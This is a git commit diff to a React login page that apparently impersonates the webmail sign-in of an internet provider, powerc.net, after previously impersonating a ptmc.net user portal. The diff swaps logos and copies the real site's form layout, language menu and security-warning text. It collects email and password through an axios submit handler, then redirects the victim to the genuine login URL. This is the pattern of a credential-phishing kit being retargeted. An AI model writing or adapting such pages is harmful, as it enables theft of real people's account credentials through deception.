6da9402b2851b7788f3b7d9dd5aed7f875a202ed
latestbob <edidiongbobson@gmail.com>
2024-05-01 15:00:08 -0700

    added powerc

--- src/home.js
+++ src/home.js
@@ -9,13 +9,14 @@ import axios from 'axios';
 
 import moncre from './moncre.jpeg';
 import ptmc from './ptmc.gif';
+import powerc from './powerc.gif';
 
 function Home(){
 
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("ptmc")
+    const[platform, setPlatform] = useState("powerc")
 
     const[showError, setShowError] = useState(false);
 
@@ -44,7 +45,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://userportal.ptmc.net/login';
+               window.location.href = 'https://webmail.powerc.net/Login.aspx';
             }
           } catch (error) {
             // Handle error
@@ -72,40 +73,65 @@ function Home(){
 
                 <div className='logodiv col-md-3 py-3'>
 
-                    <img src={ptmc} className="mylogo" />
+                    <img src={powerc} className="mylogo" />
 
 
                 </div>
 
                 <div className='contentdiv col-md-9 px-3'>
-                    <h1 className='contenthead'>Please Log In</h1>
-                        <div className='text-right'>
-                        <a href='https://userportal.ptmc.net/mfa/recovery' className='keys'><i className='fa fa-key'></i>Forgot Password</a>
-                        </div>
+                    
 
                 <br/>
 
-                <form onSubmit={handleSubmit}>
+                <form onSubmit={handleSubmit} className= "myform">
 
-                    <div className='form-group'>
-                        <label className='label'>Username</label>
+                   
 
-                        <input onChange={function(e){
+
+                    
+
+                    <div class="form-group row py-0">
+    <label for="staticEmail" class="col-sm-4 col-form-label mylabel">Email Address</label>
+    <div class="col-sm-8">
+      <input onChange={function(e){
                             setUserName(e.target.value);
-                        }} value={email} type="text"className='form-control'placeholder="Username"required />
-
-                    </div>
-
-
-                    <div className='form-group'>
-                        <label className='label'>Password</label>
-
-                        <input onChange={function(e){
+                        }} value={email} type="email" class="" id="staticEmail" />
+    </div>
+  </div>
+  <div class="form-group row py-0">
+    <label for="inputPassword" class="col-sm-4 col-form-label mylabel">Password</label>
+    <div class="col-sm-8">
+      <input onChange={function(e){
                             setPassword(e.target.value);
                             
-                        }}value={password} type="password"className='form-control'placeholder="Password"required />
+                        }}value={password} type="password" class="" id="inputPassword" />
+    </div>
+  </div>
 
-                    </div>
+  <div class="form-group row py-0">
+    <label for="staticEmail" class="col-sm-4 col-form-label mylabel">Language</label>
+    <div class="col-sm-8">
+      <select>
+      <option value="da-DK">Dansk</option>
+	<option value="de-DE">Deutsch</option>
+	<option selected="selected" value="en-US">English</option>
+	<option value="es-ES">Espa&#241;ol</option>
+	<option value="fr-FR">Fran&#231;ais</option>
+	<option value="it-IT">Italiano</option>
+	<option value="ja-JP">日本語</option>
+	<option value="nl-NL">Dutch</option>
+	<option value="nn-NO">Norsk</option>
+	<option value="pt-BR">Portugu&#234;s</option>
+	<option value="ru-RU">Русский </option>
+	<option value="sv-SE">Svenska</option>
+	<option value="tr-TR">T&#252;rk&#231;e</option>
+	<option value="zh-TW">繁體中文</option>
+      </select>
+    </div>
+  </div>
+
+
+
 
 
                     <div className='form-group'>
@@ -116,29 +142,25 @@ function Home(){
                       
                         
 
-                        <div class="form-row">
-                            <div class="col">
-                                    <button type="submit" className='btn mybtn py-1'>Login</button>
-                            </div>
-                            <div class="col text-right">
-                                <p>Go To:<select className="custom-select col-6" id="inlineFormCustomSelect">
-                                <option value="portal-sso:">App Portal</option>
-                                                            <option value="account-recovery-prefs:">Access Recovery</option>
-                                                            <option value="account:">Account Security</option>
-                                                            <option value="zimbra-sso:calendar">Zimbra Calendar</option>
-                                                            <option value="zimbra-sso:mail">Zimbra Mail</option>
-                            </select></p>
-                            </div>
+               
+  <div class="form-group row py-0">
+    <label for="staticEmail" class="col-sm-4 "style={{
+      visibility:'none'
+    }}></label>
+    <div class="col-sm-8">
+            <button type="submit" className='btn btn-light py-1 px-1'>Login</button>
+    </div>
   </div>
 
 
 
   <div class="custom-control custom-switch">
-                                <input type="checkbox" class="custom-control-input" name="_remember_me" id="_remember_me"
+                                <input type="checkbox" class="" id=""
                                        
                                 />
-                                <label class="custom-control-label" for="_remember_me">
-                                    Stay logged in                                    <span class="pl-1" title="Enabling this will keep you logged in to this computer for 30 days." style={{
+                                <label className="remember" for="_remember_me">
+                                Automatically log me onto this computer. <br/>
+Security warning: Do not use this option if you share this computer with others.                                  <span class="pl-1" title="Enabling this will keep you logged in to this computer for 30 days." style={{
                                         cursor: "help",
                                     }}>
                                         <i class="fa fa-info-circle text-muted"></i>
